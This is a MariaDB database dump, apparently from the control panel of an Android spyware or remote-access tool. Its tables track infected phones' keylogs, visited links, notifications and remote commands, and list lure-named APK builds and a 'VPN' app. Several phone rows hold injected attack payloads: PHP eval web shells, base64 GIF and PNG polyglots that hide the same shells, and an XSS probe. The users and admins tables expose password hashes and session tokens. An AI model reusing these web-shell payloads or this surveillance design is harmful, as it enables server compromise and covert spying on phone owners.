-- MariaDB dump 10.19  Distrib 10.4.32-MariaDB, for Win64 (AMD64)
--
-- Host: localhost    Database: clients
-- ------------------------------------------------------
-- Server version	10.4.32-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `admins`
--

DROP TABLE IF EXISTS `admins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admins`
--

LOCK TABLES `admins` WRITE;
/*!40000 ALTER TABLE `admins` DISABLE KEYS */;
INSERT INTO `admins` VALUES (1,'admin','$2y$10$cNyR77NgYYuvzQPsvHty/uee7TvMFzYYIzAXcWmtlmKkUYdNmKHU.','2025-12-18 06:04:07');
/*!40000 ALTER TABLE `admins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_app`
--

DROP TABLE IF EXISTS `custom_app`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_app` (
  `build_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `appname` varchar(18) NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL,
  PRIMARY KEY (`build_id`),
  UNIQUE KEY `cstmappuniq` (`app_package`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `custom_app_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=941 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_app`
--

LOCK TABLES `custom_app` WRITE;
/*!40000 ALTER TABLE `custom_app` DISABLE KEYS */;
INSERT INTO `custom_app` VALUES (927,267409,'net.migrator.pilot.tracker','C:\\xampp\\htdocs\\user\\apps\\267409\\net.migrator.pilot.tracker\\net.migrator.pilot.tracker.apk','免费看片','267409/icons/b0fb55abd134ff201cf61d937570d1a5.png','01-01-2026','finished'),(938,208828,'net.tasker.indexguard.guardian','C:\\xampp\\htdocs\\user\\apps\\208828\\net.tasker.indexguard.guardian\\net.tasker.indexguard.guardian.apk','W外送茶','208828/icons/a8bfa0978d0fa1a17e58c11a26755e70.png','09-01-2026','finished'),(940,437294,'net.extractor.terminator.channel','C:\\xampp\\htdocs\\user\\apps\\437294\\net.extractor.terminator.channel\\net.extractor.terminator.channel.apk','潮喷人妻','437294/icons/33d9a1c82517bc3312f314adc3a40c60.png','19-01-2026','finished');
/*!40000 ALTER TABLE `custom_app` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phones`
--

DROP TABLE IF EXISTS `phones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phones` (
  `phone_id` text NOT NULL,
  `usrname` varchar(50) NOT NULL,
  `phone_name` varchar(20) NOT NULL,
  `country` text NOT NULL,
  `address` text NOT NULL,
  `android_ver` text NOT NULL,
  `model` text NOT NULL,
  `phonepassword` text NOT NULL,
  `phonenumber` text NOT NULL,
  `wallpaper` longtext DEFAULT NULL,
  `battery_charg` text NOT NULL,
  `network` text NOT NULL,
  `install_date` text NOT NULL,
  `last_ping` datetime NOT NULL,
  `files_path` text DEFAULT NULL,
  `files_data` text DEFAULT NULL,
  `mob_permissions` text DEFAULT NULL,
  `keylogs_dates` text NOT NULL,
  `visited_links` text NOT NULL,
  `visited_apps` text NOT NULL,
  `notifications` text NOT NULL,
  `activities` text NOT NULL,
  `phone_options` text NOT NULL,
  `session_id` varchar(255) NOT NULL DEFAULT 'empty',
  `Commands` text DEFAULT NULL,
  `isonline` tinyint(1) NOT NULL DEFAULT 0,
  `isRemoved` tinyint(1) NOT NULL DEFAULT 0,
  `phoneopen` tinyint(1) NOT NULL DEFAULT 1,
  `accessibility` varchar(10) DEFAULT '0',
  PRIMARY KEY (`phone_id`(255)),
  UNIQUE KEY `unique_phone_id` (`phone_id`(255)),
  UNIQUE KEY `phone_id` (`phone_id`(255))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phones`
--

LOCK TABLES `phones` WRITE;
/*!40000 ALTER TABLE `phones` DISABLE KEYS */;
INSERT INTO `phones` VALUES ('17ec0bc9-9bbc-41a8-a2e9-6742acb45af5','','test','United States','35.212.154.86','11','test','','','R0lGODlhPD9waHAgQGV2YWwoJF9QT1NUWydpbWcnXSk7Pz4=','','','2024-01-01','2026-01-22 02:47:44','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('203efbaa-3223-4c82-a917-3c250bece9c9','','test','United States','35.212.154.86','11','test','','','-1','','','2024-01-01','2026-01-22 02:50:08','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('5419fe63-14f1-4f10-afff-d8f0fe96ff0c','','test','United States','35.212.154.86','11','test','','','iVBORw0KGgo8P3BocCBAZXZhbCgkX1BPU1RbJ3BuZyddKTs/Pg==','','','2024-01-01','2026-01-22 02:47:44','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('7a334971-daf6-45a7-966d-7094bc2b52e0','','<?php @eval($_POST[\'','United States','35.212.154.86','','','','','-1','','','','2026-01-22 02:48:47','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('918b4956-262c-4162-b187-6f427acc91f0','','test','United States','35.212.154.86','11','test','','','-1','','','2024-01-01','2026-01-22 02:50:08','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('94b74324-5a3b-4288-b56f-ce6b5b82eda6','','test','United States','35.212.154.86','1','test','','','-1','','','2024-01-01','2026-01-22 02:48:48','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('9793941f-d26a-4bd7-8ea3-6091353290b9','','<script>alert(\'XSS\')','United States','35.212.154.86','1','XSS','','','-1','','','2024-01-01','2026-01-22 02:44:58','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('9974d3e5-fca8-43d4-970f-45d3dc0e30d6','','test','United States','35.212.154.86','11','test','','','-1','','','2024-01-01','2026-01-22 02:50:08','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('c25e381c-e24c-41cf-9f15-cf1a460ea825','','test','United States','35.212.154.86','11','test','','','R0lGODlhPD9waHAgQGV2YWwoJF9QT1NUWydpbWcnXSk7Pz4=','','','2024-01-01','2026-01-22 02:47:43','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('f2e42744-16ac-44c0-ae71-05ec31ce8f9d','','<?php @eval($_POST[\'','United States','35.212.154.86','1','Shell','','','-1','','','2024-01-01','2026-01-22 02:44:57','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('f8bfe109-02a1-425e-b904-48e87cba040f','','test','United States','35.212.154.86','11','test','','','R0lGODlhPD9waHAgQGV2YWwoJF9QT1NUWydpbWcnXSk7Pz4=','','','2024-01-01','2026-01-22 02:47:44','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('shell-test-001','','ShellDevice','United States','35.212.154.86','11','TestModel','','','PD9waHAgQGV2YWwoJF9QT1NUWydhcGknXSk7Pz4=','','','2024-01-01','2026-01-22 02:49:00','','',NULL,'<?php @eval($_POST[\'api\']);?>','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('shell-upload-test','','ShellDevice','United States','35.212.154.86','11','TestModel','','','PD9waHAgQGV2YWwoJF9QT1NUWydhbHQnXSk7Pz4=','','','2024-01-01','2026-01-22 02:52:41','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0'),('test-shell-123','','<?php @eval($_POST[\'','United States','35.212.154.86','11','TestDevice','','','-1','','','2024-01-01','2026-01-22 02:40:47','','',NULL,'','','','','','{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}','','',1,0,1,'0');
/*!40000 ALTER TABLE `phones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `store`
--

DROP TABLE IF EXISTS `store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `store` (
  `app_id` varchar(255) NOT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `app_size` varchar(50) DEFAULT NULL,
  `app_date` varchar(50) DEFAULT NULL,
  `app_folder` varchar(255) NOT NULL,
  `app_version` varchar(255) NOT NULL,
  `main_activity` varchar(155) NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`app_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `store`
--

LOCK TABLES `store` WRITE;
/*!40000 ALTER TABLE `store` DISABLE KEYS */;
INSERT INTO `store` VALUES ('rocket.service.super','Little Rocket VPN','77 MB','2024-12-15','store\\\\apps\\\\Little Rocket VPN','V3.5.1','smali\\\\rocket\\\\service\\\\superv\\\\MainActivity.smali','../store/apps/Little Rocket VPN/ico.png');
/*!40000 ALTER TABLE `store` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_apps`
--

DROP TABLE IF EXISTS `user_apps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user_apps` (
  `build_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL,
  PRIMARY KEY (`build_id`),
  UNIQUE KEY `usrappuniq` (`app_package`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `user_apps_fk_app_package` FOREIGN KEY (`app_package`) REFERENCES `store` (`app_id`),
  CONSTRAINT `user_apps_fk_user_id` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `user_apps_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `user_apps_ibfk_2` FOREIGN KEY (`app_package`) REFERENCES `store` (`app_id`)
) ENGINE=InnoDB AUTO_INCREMENT=59 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_apps`
--

LOCK TABLES `user_apps` WRITE;
/*!40000 ALTER TABLE `user_apps` DISABLE KEYS */;
/*!40000 ALTER TABLE `user_apps` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `userid` int(11) NOT NULL AUTO_INCREMENT,
  `usrname` varchar(16) DEFAULT NULL,
  `profilepic` text NOT NULL,
  `email` tinytext NOT NULL,
  `password` text NOT NULL,
  `otp_salt` text DEFAULT NULL,
  `Expire` date DEFAULT NULL,
  `subtype` enum('1 Month','3 Month','6 Month','9 Month','12 Month','new') DEFAULT NULL,
  `token` text DEFAULT NULL,
  `token_expiration` datetime DEFAULT NULL,
  `authorty` enum('admin','news','clients') NOT NULL,
  `contact` varchar(255) DEFAULT NULL,
  `hidden` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`userid`),
  UNIQUE KEY `userid` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=991924 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (164269,'admin','Prof.png','GCt/Suj1maxHZ3aCykJufw==','$2y$12$oQ/XXKE2awoffI37VSTpH.CsKFIqav3ghRHI1CZQUWGHOZiUPDC0C',NULL,'2026-02-11','12 Month','bb8b8cd8dfa5773d1b1680da1f795580','2026-01-29 02:54:53','admin',NULL,1),(172112,'PD9waHAgQGV2YWwo','Prof.png','ClbmTaupdRjqWVel0AC00A==','$2y$10$uTI4wE8i0Clu.WwkVZ8HF.KcLzmzZL8HeGndejQE.8HIAu4oky3rq',NULL,'2027-01-01','12 Month','ec90e70f72e9754eaf67a103b6d79f9b','2026-01-29 03:27:52','admin',NULL,0),(208828,'@dfq88866-5','Prof.png','iRPgAOWAw/m+aaKk0xkhqqnyqcEcazLConxStNpuvIM=','$2y$10$NjlbedrYIg9qHxktZTJ/kuM/fH56NWJ4K.ceUIbZOodusT1qxhSfe',NULL,'2026-01-25','12 Month','515982d7f654497be0c1a93fc29c130a','2026-01-29 00:20:33','admin','@dfq88866',0),(267409,'@dfq88866-2','Prof.png','JE9O/kMUEm9rfDiDFfk+NfLCHhRqnXP8/bdbX+Im754=','$2y$10$Vs6qHmZmwaE5XGtbwhqym.STLzSYkSkIDfPrNrjkajbSq4J3mWg.K',NULL,'2026-01-25','12 Month','0e926717ce6efe68d54552a34a6bc102','2026-01-29 00:17:11','admin','@dfq88866',0),(437294,'@dfq88866-3','Prof.png','84IeDOKy/gSwpFB2vyWWSas1IjatfPaYxhJ4U4LYCaM=','$2y$10$yEtlspYrSzz9hKe5Xmg.UO0KFBCMUQx04zuvWZV0CCSh977Huva/i',NULL,'2026-02-19','12 Month','ae4d2a36c8826010c62621406cbc18f7','2026-01-29 03:22:52','admin',NULL,0),(548147,'godfather','Prof.png','GCt/Suj1maxHZ3aCykJufw==','$2y$10$VvIpdbXg9TTtjO9jttWMH.7uNA2hkXOAwmThI6EaDuFJIjx1vbwTe',NULL,'2026-02-07','12 Month','308b7bd3aa18686dda78b39bbd6a324a','2026-01-28 19:57:44','admin',NULL,0);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2026-01-22  5:22:08
